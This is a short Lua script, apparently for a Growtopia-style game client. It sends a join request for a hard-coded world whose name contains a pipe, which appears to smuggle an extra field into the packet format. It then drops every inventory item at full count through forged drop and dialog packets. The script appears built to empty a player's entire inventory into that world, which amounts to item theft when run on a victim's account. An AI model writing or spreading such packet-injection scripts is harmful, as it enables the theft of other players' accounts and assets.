local targetWorld = "KUSTF|NNAME"
SendPacket(3, "action|join_request\nname|" .. targetWorld .. "\ninvitedWorld|0")
Sleep(2500)

local inv = GetInventory()
if inv == nil then
    LogToConsole()
    return
end

for _, item in pairs(inv) do
    if item.id ~= nil and item.amount ~= nil and item.amount > 0 then
        SendPacket(2, "action|drop\n|itemID|" .. item.id)
        Sleep(100)
        SendPacket(2, "action|dialog_return\ndialog_name|drop_item\nitemID|" .. item.id .. "|\ncount|" .. item.amount)
        Sleep(100) 
    end
end
